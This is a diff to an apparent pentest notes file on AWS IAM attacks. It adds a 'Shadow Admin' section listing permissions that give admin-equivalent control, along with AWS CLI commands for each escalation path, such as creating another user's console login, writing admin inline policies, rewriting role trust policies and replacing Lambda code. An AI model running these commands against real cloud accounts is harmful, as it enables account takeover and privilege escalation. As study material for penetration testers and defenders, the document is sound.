@@ -4,8 +4,8 @@ type: technique
 tags: [aws, cloud, enumeration, iam, lateral-movement, privilege-escalation, thm]
 phase: post-exploitation
 date_created: 2026-05-08
-date_updated: 2026-05-13
-sources: [thm-aws-iam-intro, thm-aws-iam-privesc, git-cloudfox]
+date_updated: 2026-09-10
+sources: [thm-aws-iam-intro, thm-aws-iam-privesc, git-cloudfox, InternalAllTheThings]
 ---
 
 # Cloud IAM Attacks
@@ -512,6 +512,51 @@ https://console.aws.amazon.com/cloudformation/home?region=us-east-1#/stacks/new?
 ```
 
 The template can create an IAM role trusting the attacker's account, granting cross-account access.
+
+### Shadow Admin permissions
+
+Beyond the explicit paths above, a handful of individually innocuous permissions make a principal a "shadow admin": admin-equivalent control without holding `AdministratorAccess` ([CyberArk: 10 permissions to protect](https://www.cyberark.com/threat-research-blog/cloud-shadow-admin-threat-10-permissions-protect/)). Start from a full IAM snapshot, then hunt for these:
+
+```bash
+aws iam get-account-authorization-details > iam.json
+```
+
+| Permission | Shadow-admin path |
+|------------|-------------------|
+| `ec2:AssociateIamInstanceProfile` | Attach an admin instance profile to an EC2 instance you control, then harvest credentials from IMDS |
+| `iam:CreateLoginProfile` | Add a password-based login to any user and impersonate it in the console |
+| `iam:PutUserPolicy` / `iam:PutGroupPolicy` / `iam:PutRolePolicy` | Write an inline admin policy onto yourself or a compromised entity |
+| `iam:CreatePolicy` | Create a stealthy admin policy for the attach/put paths above |
+| `iam:UpdateAssumeRolePolicy` + `sts:AssumeRole` | Rewrite a privileged role's trust policy, then assume it from a non-privileged account |
+| `iam:SetDefaultPolicyVersion` | Flip an existing policy's default version to an older, more permissive one |
+| `lambda:UpdateFunctionCode` | Replace a function's code; it runs with the attached Lambda service role |
+| `glue:UpdateDevEndpoint` | Update a Glue dev endpoint's SSH key to reach its attached role |
+| `glue:CreateDevEndpoint` + `iam:PassRole` | Create a dev endpoint with a privileged Glue service role attached |
+| `iam:PassRole` + `ec2:CreateInstanceProfile` / `ec2:AddRoleToInstanceProfile` | Build a new privileged instance profile and attach it to a compromised EC2 instance |
+
+```bash
+# ec2:AssociateIamInstanceProfile
+aws ec2 associate-iam-instance-profile --iam-instance-profile Name=admin-role --instance-id i-0123456789
+
+# iam:CreateLoginProfile (console takeover; also works via iam:UpdateLoginProfile)
+aws iam create-login-profile --user-name target_user --password '|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U<9`O~Z”,jJ[iT-D^(' --no-password-reset-required
+
+# iam:PutUserPolicy (PutGroupPolicy/PutRolePolicy follow the same pattern)
+aws iam put-user-policy --user-name my_username --policy-name my_inline_policy --policy-document file://path/to/administrator/policy.json
+
+# iam:UpdateAssumeRolePolicy, then assume the role with sts:AssumeRole
+aws iam update-assume-role-policy --role-name role_i_can_assume --policy-document file://path/to/assume/role/policy.json
+
+# iam:SetDefaultPolicyVersion
+aws iam set-default-policy-version --policy-arn target_policy_arn --version-id v2
+
+# lambda:UpdateFunctionCode
+aws lambda update-function-code --function-name target_function --zip-file fileb://my/lambda/code/zipped.zip
+
+# glue:UpdateDevEndpoint / glue:CreateDevEndpoint (SSH in as the attached role)
+aws glue update-dev-endpoint --endpoint-name target_endpoint --public-key file://path/to/my/public/ssh/key.pub
+aws glue create-dev-endpoint --endpoint-name my_dev_endpoint --role-arn arn_of_glue_service_role --public-key file://path/to/my/public/ssh/key.pub
+```
 
 ---
 
